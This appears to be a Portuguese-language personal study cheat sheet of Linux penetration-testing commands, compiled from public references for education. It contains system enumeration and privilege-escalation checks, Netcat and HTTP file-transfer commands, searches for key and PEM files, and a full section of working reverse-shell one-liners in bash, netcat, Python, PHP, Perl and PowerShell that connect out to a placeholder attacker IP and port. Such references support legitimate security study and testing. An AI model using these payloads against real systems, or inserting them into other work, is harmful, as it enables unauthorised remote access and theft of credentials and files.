> ⚠️ Notas de estudo pessoal, compiladas a partir de referências públicas (HackTricks, PayloadsAllTheThings, g0tmi1k) para fins educacionais.

# Linux Commands for Cybersecurity

## Enumeração e Reconhecimento

| Comando | Função |
|---|---|
| hostname | Exibe o nome do host atual. |
| uname -a | Mostra informações do kernel e da arquitetura do sistema. |
| ip a | Lista endereços IP e interfaces de rede. |
| ss -tulpn | Exibe portas abertas e processos associados. |
| whoami | Mostra o usuário autenticado no momento. |
| id | Apresenta o ID do usuário e seus grupos. |
| sudo -l | Lista comandos que o usuário pode executar com sudo. |
| netstat -tulpn | Mostra conexões e portas de rede abertas. |

## Privilege Escalation em Linux

| Comando | Função |
|---|---|
| sudo -l | Identifica comandos permitidos para execução com sudo. |
| id | Confere privilégios e grupos do usuário atual. |
| cat /etc/passwd | Lista usuários do sistema para análise inicial. |
| cat /etc/sudoers | Mostra regras de sudo e permissões elevadas. |
| find / -perm -4000 2>/dev/null | Localiza binários com bit SUID. |
| find / -type f -name '*.sh' 2>/dev/null | Procura scripts relevantes para exploração. |
| crontab -l | Exibe tarefas agendadas do usuário atual. |
| ls -la /var/spool/cron | Lista cronjobs do sistema para revisão. |

## Reverse Shells

| Comando | Função |
|---|---|
| bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 | Abre uma shell remota reversa para o atacante. |
| nc -e /bin/bash <IP> <PORT> | Conecta uma shell de volta usando Netcat. |
| python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("<IP>",<PORT>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])' | Gera uma reverse shell em Python. |
| php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/bash -i <&3 >&3 2>&3");' | Cria uma shell reversa com PHP. |
| perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");' | Executa uma reverse shell em Perl. |
| powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -gt 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendback2 = [System.Text.Encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendback2,0,$sendback2.Length);$stream.Flush()};$client.Close()" | Gera uma reverse shell em PowerShell. |

## Transferência de Arquivos

| Comando | Função |
|---|---| 
| nc -lvnp <PORT> > arquivo | Recebe arquivos via Netcat. |
| nc -w 3 <IP> <PORT> < arquivo | Envia arquivos via Netcat. |
| python3 -m http.server <PORT> | Sobe um servidor HTTP simples para download. |
| wget http://<IP>:<PORT>/arquivo | Baixa arquivos de um servidor HTTP. |
| curl -O http://<IP>:<PORT>/arquivo | Faz download de arquivos com cURL. |
| scp arquivo.txt user@<IP>:/tmp/ | Copia arquivos via SSH. |

## Pós-Exploração

| Comando | Função |
|---|---|
| whoami | Confirma o usuário comprometido após a exploração. |
| id | Verifica privilégios e grupos atuais. |
| uname -a | Coleta informações do sistema alvo. |
| cat /etc/hosts | Exibe mapeamento de hosts do sistema. |
| find /home -type f 2>/dev/null | Procura arquivos relevantes em diretórios de usuários. |
| find / -type f \( -name '*.key' -o -name '*.pem' -o -name '*.txt' \) 2>/dev/null | Busca credenciais e arquivos sensíveis. |
| ps aux | Lista processos em execução para análise. |
| netstat -antp | Mostra conexões de rede e processos associados. |
